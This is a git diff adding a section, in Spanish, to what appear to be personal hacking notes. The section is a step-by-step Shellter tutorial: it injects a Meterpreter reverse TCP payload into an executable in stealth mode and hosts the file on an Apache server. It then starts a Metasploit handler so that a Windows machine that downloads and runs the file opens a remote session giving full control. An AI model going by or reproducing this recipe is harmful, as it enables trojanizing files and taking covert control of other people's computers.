@@ -434,6 +434,39 @@ rmdir <nombre directorio> (Borrar directorio)
 --- En estos momentos se tiene control total en la máquina con windows desde kali
 
 
+++ Shellter
+--- Instalar el programa: apt install shellter
+--- Ejecutar los siguientes comandos
+--- shellter
+--- Seleccionar la opcion: A
+--- Indicar la ruta del archivo (ruta_completa), ejemplo: /root/Desktop/<archivo>
+--- Habilitar stealth mode: Y
+--- Indicar el tipo de payload: L (listed)
+--- Indicar el índice del payload: 1 (Meterpreter_Reverse_TCP)
+--- Indicar la ip local
+--- Indicar el puerto (ejemplo: 8080)
+--- En este punto ya se ha inyectado el código malicioso en el archivo
+--- cp <nombre_archivo> /var/www/html (Copia el archivo al servidor apache)
+--- msfconsole 
+--- use exploit/multi/handler
+--- set payload windows/meterpreter/reverse_tcp
+--- set LHOST <ip_local>
+--- set LPORT <8080>
+--- run
+--- Ir a la pc con windows
+--- Colocar la ip del kali
+--- Descargar el archivo y ejecutarlo
+--- Volver al kali
+--- En la terminal veremos una nueva sesión, lo que indica que tenemos control total sobre el equipo windows
+--- 
+
+
+
+
+
+
+
+
 
 
 
